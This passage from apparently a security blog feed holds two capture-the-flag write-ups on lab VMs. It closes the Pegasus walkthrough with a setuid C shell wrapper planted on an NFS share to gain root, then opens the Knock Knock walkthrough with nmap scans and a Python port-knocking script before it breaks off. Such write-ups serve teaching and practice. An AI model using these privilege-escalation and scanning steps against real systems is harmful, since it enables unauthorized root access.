</span><span class='line'>root@kali:/mnt/nfs# ls -la
</span><span class='line'>total 8
</span><span class='line'>drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Nov <span class="m">18</span> 03:43 .
</span><span class='line'>drwxr-xr-x <span class="m">4</span> root root <span class="m">4096</span> Dec <span class="m">19</span> 13:09 ..
</span></code></pre></td></tr></table></div></figure>


<p>OK, so a quick side note here - my Kali box is 64 bit&hellip; if it were 32 bit I could just copy /bin/sh to /mnt/nfs and suid it. So, in this case, I have to use a C wrapper to execute a shell instead.</p>

<p>The code for the C wrapper is pretty straight forward</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>        <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/dash&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>This is then compiled as a 32 bit binary, dropped into /mnt/nfs on my Kali box, and chmodded to 4777</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:/mnt/nfs# gcc wrapper.c -m32
</span><span class='line'>root@kali:/mnt/nfs# chmod <span class="m">4777</span> a.out
</span></code></pre></td></tr></table></div></figure>


<p>Which, when executed as user john, drops me to a root shell</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>john@pegasus:/opt/nfs<span class="nv">$ </span>ls -la
</span><span class='line'>ls -la
</span><span class='line'>total 32
</span><span class='line'>drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Dec <span class="m">20</span> 00:17 .
</span><span class='line'>drwxr-xr-x <span class="m">5</span> root root <span class="m">4096</span> Nov <span class="m">18</span> 20:51 ..
</span><span class='line'>-rwsrwxrwx <span class="m">1</span> root root <span class="m">7160</span> Dec <span class="m">20</span> 00:17 a.out
</span><span class='line'>john@pegasus:/opt/nfs<span class="nv">$ </span>./moo2
</span><span class='line'>./a.out
</span><span class='line'><span class="c"># id</span>
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>john<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>mike<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1001<span class="o">(</span>mike<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Allowing the grail of grails&hellip; the ability to cat /root/flag</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># cat flag</span>
</span><span class='line'>               ,
</span><span class='line'>               <span class="p">|</span><span class="sb">`</span><span class="se">\</span>
</span><span class='line'>              /<span class="s1">&#39;_/_</span>
</span><span class='line'><span class="s1">            ,&#39;</span>_/<span class="se">\_</span>/<span class="se">\_</span>                       ,
</span><span class='line'>          ,<span class="s1">&#39;_/\&#39;_\_,/_                    ,&#39;</span><span class="p">|</span>
</span><span class='line'>        ,<span class="s1">&#39;_/\_&#39;</span>_ <span class="se">\_</span> <span class="se">\_</span>/                _,-<span class="s1">&#39;_/</span>
</span><span class='line'><span class="s1">      ,&#39;</span>_/<span class="s1">&#39;\_&#39;</span>_ <span class="se">\_</span> <span class="se">\&#39;</span>_,<span class="se">\ </span>          _,-<span class="s1">&#39;_,-/ \,      Pegasus is one of the best</span>
</span><span class='line'><span class="s1">    ,&#39;</span> /_<span class="se">\ </span>_<span class="s1">&#39;_ \_ \&#39;_,/       __,-&#39;</span>&lt;_,<span class="s1">&#39; _,\_,/      known creatures in Greek</span>
</span><span class='line'><span class="s1">   ( (&#39;</span> <span class="o">)</span><span class="se">\/</span><span class="o">(</span>_ <span class="se">\_</span> <span class="se">\&#39;</span>_,<span class="se">\ </span>  __--<span class="s1">&#39; _,-_/_,-&#39;</span>,_/ _<span class="se">\ </span>     mythology. He is a winged
</span><span class='line'>    <span class="se">\_</span><span class="sb">`</span><span class="se">\&gt;</span> 6<span class="sb">`</span> <span class="m">7</span>  <span class="se">\&#39;</span>_,/ ,-<span class="s1">&#39; _,-,&#39;</span><span class="se">\,</span>_<span class="s1">&#39;_ \,_/&#39;</span>_,<span class="se">\ </span>      stallion usually depicted
</span><span class='line'>     <span class="se">\/</span>-  _/ <span class="m">7</span> <span class="s1">&#39;/ _,&#39;</span> _/<span class="s1">&#39;\_  \,_&#39;</span>_ <span class="se">\_</span> <span class="se">\&#39;</span>_,/         as pure white in color.
</span><span class='line'>      <span class="se">\_</span><span class="s1">&#39;/&gt;   7&#39;</span>_/<span class="s1">&#39; _/&#39;</span> <span class="se">\_</span> <span class="s1">&#39;\,_&#39;</span>_ <span class="se">\_</span> <span class="se">\&#39;</span>_,<span class="se">\ </span>         Symbol of wisdom and fame.
</span><span class='line'>        &gt;/  _ ,V  ,&lt;  <span class="se">\_</span>_ <span class="s1">&#39;\,_&#39;</span>_ <span class="se">\_</span> <span class="se">\&#39;</span>_,/
</span><span class='line'>      /<span class="s1">&#39;_  ( )_)\/-,&#39;</span>,__ <span class="s1">&#39;\,_&#39;</span>_,<span class="se">\_</span>,<span class="se">\&#39;</span>_<span class="se">\ </span>            Fun fact: Pegasus was also
</span><span class='line'>     <span class="o">(</span> <span class="o">)</span> <span class="se">\_</span> <span class="se">\|</span>_  <span class="sb">`</span><span class="se">\_</span>    <span class="se">\_</span>,/<span class="s1">&#39;\,_&#39;</span>_,/<span class="err">&#39;</span>               a video game system sold in
</span><span class='line'>      <span class="se">\\</span>_  <span class="se">\_\_</span><span class="o">)</span>    <span class="sb">`</span><span class="se">\_</span>                             Poland, Serbia and Bosnia.
</span><span class='line'>       <span class="se">\_</span><span class="o">)</span>   &gt;        <span class="sb">`</span><span class="se">\_</span>                           It was a hardware clone of
</span><span class='line'>            /  <span class="sb">`</span>,      <span class="p">|</span><span class="sb">`</span><span class="se">\_</span>                         the Nintendo Famicom.
</span><span class='line'>           /    <span class="se">\ </span>    / <span class="se">\ </span><span class="sb">`</span><span class="se">\</span>
</span><span class='line'>          /   __/<span class="p">|</span>   /  /  <span class="sb">`</span><span class="se">\</span>
</span><span class='line'>         <span class="o">(</span><span class="sb">`</span>  <span class="o">(</span>   <span class="o">(</span><span class="sb">`</span> <span class="o">(</span>_  <span class="se">\ </span>  /
</span><span class='line'>         /  ,/    <span class="p">|</span>  /  /   <span class="se">\</span>
</span><span class='line'>        / ,/      <span class="p">|</span> /   <span class="se">\ </span>  <span class="sb">`</span><span class="se">\_</span>
</span><span class='line'>      _/_/        <span class="p">|</span>/    /__/,_/
</span><span class='line'>     /_<span class="o">(</span>         /_<span class="o">(</span>
</span><span class='line'>
</span><span class='line'>CONGRATULATIONS! You made it :<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Hope you enjoyed the challenge as much as I enjoyed creating it and I hope you
</span><span class='line'>learnt a thing or two <span class="k">while</span> doing it! :<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Massive thanks and a big shoutout to @iMulitia <span class="k">for</span> beta-breaking my VM and
</span><span class='line'>providing first review.
</span><span class='line'>
</span><span class='line'>Feel free to hit me up on Twitter @TheKnapsy or at <span class="c">#vulnhub channel on freenode</span>
</span><span class='line'>and leave some feedback, I would love to hear from you!
</span><span class='line'>
</span><span class='line'>Also, make sure to follow @VulnHub on Twitter and keep checking vulnhub.com <span class="k">for</span>
</span><span class='line'>more awesome boot2root VMs!
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://media.tumblr.com/tumblr_m7bmngSpkh1rs4olx.gif" alt="" /></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Knock Knock... Who's There ?]]></title>
    <link href="http://recrudesce.github.io/2014/10/26/knock-knock-whos-there/"/>
    <updated>2014-10-26T18:42:03+00:00</updated>
    <id>http://recrudesce.github.io/2014/10/26/knock-knock-whos-there</id>
    <content type="html"><![CDATA[<p><a href="https://twitter.com/zer0w1re">zer0w1re</a> released his first VM, <a href="http://vulnhub.com/entry/knock-knock-11,105/">Knock Knock</a>, so I downloaded it and had a go (truth be told, I tested it before the public release, but this writeup is for the version available on Vulnhub.)</p>

<!-- more -->


<p><img src="http://www.quickmeme.com/img/24/24feb14fa531ddb2c9fbe31c1607f6b71e1dd30c6b5820790e8110da7f8f8d3e.jpg" alt="" /></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# nmap -sS -T5 -p- -O --script banner 172.16.56.139
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.47 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-10-23 18:55 BST
</span><span class='line'>Nmap scan report <span class="k">for</span> 172.16.56.139
</span><span class='line'>Host is up <span class="o">(</span>0.00044s latency<span class="o">)</span>.
</span><span class='line'>Not shown: <span class="m">65534</span> filtered ports
</span><span class='line'>PORT     STATE SERVICE
</span><span class='line'>1337/tcp open  waste
</span><span class='line'><span class="p">|</span>_banner: <span class="o">[</span>57154, 48662, 9528<span class="o">]</span>
</span><span class='line'>MAC Address: 00:0C:29:DE:8D:33 <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'>Warning: OSScan results may be unreliable because we could not find at least <span class="m">1</span> open and <span class="m">1</span> closed port
</span><span class='line'>Device <span class="nb">type</span>: general purpose
</span><span class='line'>Running: Linux 2.6.X<span class="p">|</span>3.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
</span><span class='line'>OS details: Linux 2.6.32 - 3.10, Linux 3.2, Linux 3.2 - 3.10
</span><span class='line'>Network Distance: <span class="m">1</span> hop
</span><span class='line'>
</span><span class='line'>OS detection performed. Please report any incorrect results at http://nmap.org/submit/ .
</span><span class='line'>Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 94.00 seconds
</span><span class='line'>root@pwk:~#
</span></code></pre></td></tr></table></div></figure>


<p>Connecting to port 1337 results in 3 numbers.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# nc 172.16.56.139 1337
</span><span class='line'><span class="o">[</span>56861, 38987, 45887<span class="o">]</span>
</span><span class='line'>root@pwk:~#
</span></code></pre></td></tr></table></div></figure>


<p>I guess I&rsquo;m knocking some ports then.
NB: in the test version, these 3 ports were in order, in the release version they&rsquo;re randomised. So rather than knocking them in the order returned, we&rsquo;re going to have to write a python script to do all possible port orders. The fun thing here is we don&rsquo;t need to check anything after each knock attempt - we just knock the port numbers in all possible combinations and then check afterwards for any new ports.</p>

<p>I couldn&rsquo;t be bothered to write my own script, so I stole <a href="https://leonjza.github.io/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock/">Leonjza&rsquo;s</a>, as I was talking to him about it at the time</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">itertools</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="n">destination</span> <span class="o">=</span> <span class="s">&quot;192.168.56.203&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">clean_up_ports</span><span class="p">(</span><span class="n">raw_string</span><span class="p">):</span>
</span><span class='line'>    <span class="sd">&quot;&quot;&quot; Clean up the raw string received on the socket&quot;&quot;&quot;</span>
</span><span class='line'>    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">raw_string</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>        <span class="k">return</span> <span class="bp">None</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># Remove the first [</span>
</span><span class='line'>    <span class="n">raw_string</span> <span class="o">=</span> <span class="n">raw_string</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&#39;[&#39;</span><span class="p">,</span><span class="s">&#39;&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="c"># Remove the second ]</span>
</span><span class='line'>    <span class="n">raw_string</span> <span class="o">=</span> <span class="n">raw_string</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">&#39;]&#39;</span><span class="p">,</span><span class="s">&#39;&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="c"># split by commas</span>
</span><span class='line'>    <span class="n">first_list</span> <span class="o">=</span> <span class="n">raw_string</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39;,&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># start e empty return list</span>
</span><span class='line'>    <span class="n">ports</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">port</span> <span class="ow">in</span> <span class="n">first_list</span><span class="p">:</span>
</span><span class='line'>        <span class="c"># strip the whitespace around the string</span>
</span><span class='line'>        <span class="c"># and cast to a integer</span>
</span><span class='line'>        <span class="n">ports</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="o">.</span><span class="n">strip</span><span class="p">()))</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span>  <span class="n">ports</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Getting sequence&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">try</span><span class="p">:</span>
</span><span class='line'>        <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">destination</span><span class="p">,</span> <span class="mi">1337</span><span class="p">))</span>
</span><span class='line'>    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;[+] Unable to connect to </span><span class="si">%s</span><span class="s"> on port 1337. </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">destination</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
</span><span class='line'>        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># receive the list</span>
</span><span class='line'>    <span class="n">raw_list</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># get the ports in a actual python list</span>
</span><span class='line'>    <span class="n">ports</span> <span class="o">=</span> <span class="n">clean_up_ports</span><span class="p">(</span><span class="n">raw_list</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Sequence is </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">ports</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Knocking on the door using all the possible combinations...</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># Lets knock all of the possible combinations of the ports list</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">port_list</span> <span class="ow">in</span> <span class="n">itertools</span><span class="o">.</span><span class="n">permutations</span><span class="p">(</span><span class="n">ports</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;[+] Knocking with sequence: </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">port_list</span><span class="p">,)</span>
</span><span class='line'>        <span class="k">for</span> <span class="n">port</span> <span class="ow">in</span> <span class="n">port_list</span><span class="p">:</span>
</span><span class='line'>            <span class="k">print</span> <span class="s">&quot;[+] Knocking on port </span><span class="si">%s</span><span class="s">:</span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">destination</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
</span><span class='line'>            <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>            <span class="n">sock</span><span class="o">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span><span class='line'>            <span class="n">sock</span><span class="o">.</span><span class="n">connect_ex</span><span class="p">((</span><span class="n">destination</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
</span><span class='line'>            <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;[+] Finished sequence knock</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Knock knock opener&quot;</span>
</span><span class='line'>    <span class="n">main</span><span class="p">()</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Done&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>He&rsquo;s a clever one :P</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# python knock.py
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knock knock opener
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Getting sequence
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Sequence is <span class="o">[</span>37430, 5311, 17504<span class="o">]</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking on the door using all the possible combinations...
</span><span class='line'>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking with sequence: <span class="o">(</span>37430, 5311, 17504<span class="o">)</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking on port 172.16.56.139:37430
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking on port 172.16.56.139:5311
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking on port 172.16.56.139:17504
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Finished sequence knock
</span><span class='line'>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking with sequence: <span class="o">(</span>37430, 17504, 5311<span class="o">)</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking on port 172.16.56.139:37430
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking on port 172.16.56.139:17504
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking on port 172.16.56.139:5311
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Finished sequence knock
</span><span class='line'>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking with sequence: <span class="o">(</span>5311, 37430, 17504<span class="o">)</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking on port 172.16.56.139:5311
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking on port 172.16.56.139:37430
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking on port 172.16.56.139:17504
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Finished sequence knock
</span><span class='line'>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking with sequence: <span class="o">(</span>5311, 17504, 37430<span class="o">)</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking on port 172.16.56.139:5311
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking on port 172.16.56.139:17504
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking on port 172.16.56.139:37430
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Finished sequence knock
</span><span class='line'>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking with sequence: <span class="o">(</span>17504, 37430, 5311<span class="o">)</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking on port 172.16.56.139:17504
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking on port 172.16.56.139:37430
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking on port 172.16.56.139:5311
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Finished sequence knock
</span><span class='line'>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking with sequence: <span class="o">(</span>17504, 5311, 37430<span class="o">)</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking on port 172.16.56.139:17504
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking on port 172.16.56.139:5311
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Knocking on port 172.16.56.139:37430
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Finished sequence knock
</span><span class='line'>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Done
</span><span class='line'>root@pwk:~#
</span></code></pre></td></tr></table></div></figure>


<p>Now another NMAP is required to see what opened (if anything)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~/# nmap -sS -T5 --script banner 172.16.56.139
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.47 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-10-23 19:14 BST
</span><span class='line'>Nmap scan report <span class="k">for</span> 172.16.56.139
</span><span class='line'>Host is up <span class="o">(</span>0.00025s latency<span class="o">)</span>.
</span><span class='line'>Not shown: <span class="m">998</span> filtered ports
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>22/tcp open  ssh
</span><span class='line'><span class="p">|</span>_banner: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2
</span><span class='line'>80/tcp open  http
</span><span class='line'>MAC Address: 00:0C:29:DE:8D:33 <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 25.87 seconds
</span><span class='line'>root@pwk:~/#
</span></code></pre></td></tr></table></div></figure>


<p>The HTTP server is hosting a simple page, which displays an image of a door, and text asking us to look deeper.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/10/knockknock_001.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/10/knockknock_001.png" alt="knockknock_001" /></a></p>

<p>Now, if that&rsquo;s not an invitation to look inside the JPG, then I don&rsquo;t know what is.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
